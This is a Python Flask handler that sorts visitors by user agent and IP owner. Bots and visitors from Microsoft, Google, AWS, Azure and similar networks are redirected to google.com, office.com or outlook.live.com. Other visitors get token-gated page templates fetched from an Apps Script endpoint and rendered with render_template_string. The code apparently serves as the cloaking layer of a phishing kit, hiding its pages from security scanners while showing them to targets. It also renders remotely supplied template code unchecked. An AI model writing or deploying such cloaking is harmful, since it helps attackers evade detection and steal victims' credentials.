import requests
import json
import random
import re
from flask import render_template_string, request, redirect
from dotenv import load_dotenv
import os

load_dotenv()

class PageTemplateHandler:
    def __init__(self):
        self.APPSCRIPT_URL = os.getenv('APPSCRIPT_URL')
        self.FLAGGED_IPS = set()
        self.LEGITIMATE_DOMAINS = [
            "https://www.google.com",
            "https://www.office.com",
            "https://outlook.live.com",
            "https://www.microsoft.com",
            "https://www.bing.com",
            "https://www.yahoo.com"
        ]
        self.IPHUB_API_KEY = os.getenv('IPHUB_API_KEY')
        self.ABUSEIPDB_API_KEY = os.getenv('ABUSEIPDB_API_KEY')

    def is_bot_or_org(self, ip, user_agent, org_info):
        org_keywords = ['microsoft', 'google', 'amazon', 'digital ocean', 'azure',
                       'aws', 'oracle', 'facebook', 'twitter', 'linkedin']
        
        bot_patterns = [
            r'bot', r'crawler', r'spider', r'slurp', r'mediapartners',
            r'googleapis', r'chrome-lighthouse', r'pingdom', r'pagespeed'
        ]
        
        user_agent = user_agent.lower()
        org_info = org_info.lower() if org_info else ""
        
        if any(re.search(pattern, user_agent) for pattern in bot_patterns):
            return True
            
        if any(keyword in org_info for keyword in org_keywords):
            return True
            
        return False

    def is_ip_flagged(self, ip):
        if ip in self.FLAGGED_IPS:
            return True

        try:
            headers = {"X-Key": self.IPHUB_API_KEY}
            response = requests.get(f"https://v2.api.iphub.info/ip/{ip}", headers=headers)
            if response.status_code == 200 and response.json().get("block", 0) == 1:
                self.FLAGGED_IPS.add(ip)
                return True

            headers = {"Key": self.ABUSEIPDB_API_KEY, "Accept": "application/json"}
            response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}", headers=headers)
            if response.status_code == 200 and response.json().get("data", {}).get("abuseConfidenceScore", 0) > 50:
                self.FLAGGED_IPS.add(ip)
                return True
        except Exception as e:
            print("Error checking IP:", e)

        return False

    def verify_page_visit(self, complete_url, token):
        try:
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            payload = {
                'action': 'verifyPageVisit',
                'completeUrl': complete_url,
                'token': token,
                'key': os.getenv('SCRIPT_KEY')
            }
            response = requests.post(self.APPSCRIPT_URL, headers=headers, data=payload)
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    return {
                        'success': True,
                        'templateCode': data.get('templateCode'),
                        'status': data.get('status', 'active')
                    }
                return {
                    'success': False,
                    'error': data.get('error', 'Invalid response from server')
                }
            return {
                'success': False,
                'error': f'Server error: {response.status_code}'
            }
        except Exception as e:
            print("Exception in verify_page_visit:", str(e))
            return {
                'success': False,
                'error': str(e)
            }

    def handle_token_template(self, token):
        visitor_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        try:
            ip_info = requests.get(f'https://ipinfo.io/{visitor_ip}/json').json()
            org_info = ip_info.get('org', '')
            
            if self.is_bot_or_org(visitor_ip, user_agent, org_info):
                return redirect(random.choice(self.LEGITIMATE_DOMAINS)), None
                
        except Exception as e:
            print(f"Error checking IP info: {e}")

        if not user_agent or "bot" in user_agent.lower() or "crawler" in user_agent.lower():
            return None, "Access denied: Suspicious activity detected"

        if self.is_ip_flagged(visitor_ip):
            return None, "Access denied: Suspicious activity detected"

        try:
            complete_url = request.url
            page_data = self.verify_page_visit(complete_url, token)
            
            if not page_data['success']:
                return None, page_data['error']
            
            return render_template_string(page_data['templateCode']), None
            
        except Exception as e:
            return None, f"Error processing template: {str(e)}"